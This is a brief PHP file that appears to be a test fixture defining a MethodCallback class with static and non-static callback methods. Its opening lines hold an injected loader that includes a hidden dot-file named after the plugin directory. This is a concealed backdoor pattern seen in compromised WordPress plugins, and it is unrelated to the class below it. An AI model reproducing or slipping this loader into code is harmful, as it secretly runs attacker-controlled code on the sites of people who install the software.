<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MethodCallback
{
    public static function staticCallback()
    {
        $args = func_get_args();

        if ($args == array('foo', 'bar')) {
            return 'pass';
        }
    }

    public function nonStaticCallback()
    {
        $args = func_get_args();

        if ($args == array('foo', 'bar')) {
            return 'pass';
        }
    }
}
